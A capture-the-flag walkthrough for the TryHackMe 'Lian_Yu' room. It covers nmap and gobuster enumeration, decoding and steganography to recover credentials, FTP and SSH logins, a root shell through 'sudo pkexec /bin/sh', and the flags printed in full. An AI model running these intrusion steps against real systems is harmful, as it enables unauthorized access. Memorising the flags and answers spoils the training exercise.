# Lian_Yu - TryHackme Writeup Walkthrough

Room link : https://tryhackme.com/room/lianyu


# 1. Scanning the IP
  
  ```bash
  nmap -sC -sV 10.10.228.22 
```
  
  ![1](https://user-images.githubusercontent.com/119054834/204704431-03aa0bc5-a557-45db-be3a-bf06c28897cb.png)

```bash
Ports found ---
port 21/tcp - FTP - (vsftpd 3.0.2)
port 22/tcp - SSH - (OpenSSH 6.7p1)
port 80/tcp - HTTP - (Apache httpd)
port 111/tcp - RPC - (rpcbind) 
```

# 2. Enumeration

```bash
Visit the IP 
```
![ipvisit](https://user-images.githubusercontent.com/119054834/204705444-427b5bd9-cf36-4f4c-b4d7-aff2af9cd883.png)
  ```bash
Now run gobuster for hidden Directories.
```
```bash
gobuster dir -u http://10.10.228.22/ -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![hidden dr](https://user-images.githubusercontent.com/119054834/204705829-a864fe7c-5d5a-41c3-9633-4c4911aadc30.png)
```bash
Found a directory : /island
```
```bash
Now go to the browser and serarch http://10.10.228.22/island
```

![highligj](https://user-images.githubusercontent.com/119054834/204706876-b704c5ba-2cc8-42b3-8996-5431943e365e.png)

![gottheword](https://user-images.githubusercontent.com/119054834/204706887-57e0d78d-d11a-4383-aa2f-67ce57c4a86c.png)

```bash
Found out the Code Word by highlighting the page text or viewing the page source.
Code Word -  'vigilante' - (this is our FTP username)
```

```bash
Again run gobuster on /island directory to discover a different directory.
```
```bash
gobuster dir -u http://10.10.228.22/island -w/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
![2100](https://user-images.githubusercontent.com/119054834/204708983-f9f739b5-3547-4520-a4a7-9aa0f4c571f7.png)

```bash
Here we found another directory : /2100 -- (What is the Web Directory you found?)
```

```bash
Now doing the same again go to the browser and serarch http://10.10.228.22/island/2100
```
![pgsource](https://user-images.githubusercontent.com/119054834/204710087-412a785a-bcb9-4911-9ff6-3a227ac88d6f.png)

```bash
View the page source -- 
```
![ticket](https://user-images.githubusercontent.com/119054834/204710197-498e8a6b-9dfb-4560-a73d-552b80ba94db.png)

```bash
Here it says there is a file with a '.ticket' extension.
```
```bash
Now again run gobuster to look for files with a '.ticket' extension.
```
```bash
gobuster dir --url 10.10.228.22/island/2100 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket 
```
![green ticket](https://user-images.githubusercontent.com/119054834/204712070-d4d4d78d-b2e3-469b-9aba-5c60d55f9896.png)

```bash
Found another director : /green_arrow.ticket -- (what is the file name you found?)
```
```bash 
Again going to the browser search http://10.10.228.22/island/2100/green_arrow.ticket.
```
![rty](https://user-images.githubusercontent.com/119054834/204712578-aa367484-238c-44bf-ba96-ebdc69cd0202.png)

```bash
Seems we found an encryption : 'RTy8yhBQdscX' .  So now lets try to decode it ---

Go to https://gchq.github.io/CyberChef/

Use 'FromBase58' to decode it.
```
![hash](https://user-images.githubusercontent.com/119054834/204713677-f62752e5-e6f0-4133-a829-2134dac5a3b2.png)

```bash
Seems like we have cracked it : '!#th3h00d' - This is the FTP Password. -- (what is the FTP Password?)
```

# 3. Now the FTP Login

```bash
Now as we have the username and passowrd ---
Username - vigilante
password - !#th3h00d

We can log in to the FTP service - 
```
![img files](https://user-images.githubusercontent.com/119054834/204716038-9301adf5-77a7-4c40-bfbf-ccaed5680bf4.png)

```bash
We got two users: 'vigilante' and 'slade' .
Also found 3 image files in the server. Download them in you system --- Follow the down commands to download the files -- 
```
![download](https://user-images.githubusercontent.com/119054834/204720485-509a69d7-98d2-419b-a0db-559180554bfb.png)

```bash
Now view the image files and we see that 'Leave.me.alone.png' is not opening.
Also the exiftool shows 'File Format error'
```
![pics](https://user-images.githubusercontent.com/119054834/204725099-ee18de71-fe4a-4b75-97b9-8e7b131326e9.png)
![exiftool](https://user-images.githubusercontent.com/119054834/204725349-fddd169c-bf7a-43cb-a4dd-3b2ef3a9237e.png)

```bash
Checking the header file of the image we found that it is actually wrong there.
```
![change](https://user-images.githubusercontent.com/119054834/204731008-cc259d3e-f9e9-489b-8096-1fe53cf3f2af.png)

```bash
The correct header -- https://en.wikipedia.org/wiki/Portable_Network_Graphics
```
![correct](https://user-images.githubusercontent.com/119054834/204731135-e25be51b-ff4f-4182-839e-b00d892480e6.png)

```bash
Now lets change it -- 
```
![nowcorrect](https://user-images.githubusercontent.com/119054834/204731235-953dc235-9bd4-4a59-8301-743468b26887.png)

```bash
Now you can open the image file Here you got a password : 'password' 
```
![leaveme](https://user-images.githubusercontent.com/119054834/204734956-d1601a47-f823-4202-a206-e39b937150ad.png)

```bash
Now lets use steghide to extract any hidden files within the other image files.
```
```bash
steghide extract -sf aa.jpg
```
![extr](https://user-images.githubusercontent.com/119054834/204743926-86e6f2ee-527f-4f6c-8cf9-33bb466b4d12.png)

```bash
Now using the password 'password' we got earlier successfully extracted the .jpg file to a ss.zip file. 
We found a  a 'passwd.txt' and a 'shado file' unzipping the ss.zip file. 
```
![m3ta](https://user-images.githubusercontent.com/119054834/204744274-0025a238-5b73-462f-8af3-0d27b94f0b46.png)

```bash
Now cat 'shado' file and you get a password : 'M3tahuman' -- (ssh password) --- (what is the file name with SSH password?)
```
![mt](https://user-images.githubusercontent.com/119054834/204745041-4fae5e35-7b71-4ab5-9b91-2b037dc0faf8.png)

# 4. SSH Login

```bash
Now as we have got the ssh password we can now login -- 
User - slade 
password - M3tahuman
```
```bash
ssh slade@10.10.228.22   
```
![slade](https://user-images.githubusercontent.com/119054834/204746967-0dee761b-e105-4eb7-8160-52b84136945f.png)

```bash
Now that you're logged in search the user.txt flag --
```
```bash
slade@LianYu:~$ ls
user.txt
```
![user](https://user-images.githubusercontent.com/119054834/204747894-2d00d43a-79de-4ef6-9a74-760b325836e8.png)

```bash
user.txt - 'THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}'
```

# 5. Root Privilege Escalation

```bash
To find which commands we can run with root privileges we can run: ---
```
```bash
sudo -l
```
![slade2](https://user-images.githubusercontent.com/119054834/204750224-9ce2ae79-8a5a-4ab0-bc02-44d43f8c7978.png)

```bash
After running sudo -l , it will again ask for slade password -- use the same password - 'M3tahuman'.


Now You see it says we can run the 'pkexec' with root privileges ---- So now we can run run '/bin/sh' program as root & get the root access.
```
```bash
sudo pkexec /bin/sh
```
![root](https://user-images.githubusercontent.com/119054834/204752313-4153109a-d8bb-4191-9ad8-cb91a8d4ecd5.png)

```bash
root.txt - 'THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}'
```

```bash
Submit the flags
```

What is pkexec vulnerability ? 

-- A vulnerability (CVE-2021-4034) in Polkit's pkexec has been weaponized in the wild. This vulnerability is present in the default configuration of all major Linux distributions and can be exploited to gain full root privileges on the system.


I hope this was helpful.

thanks.
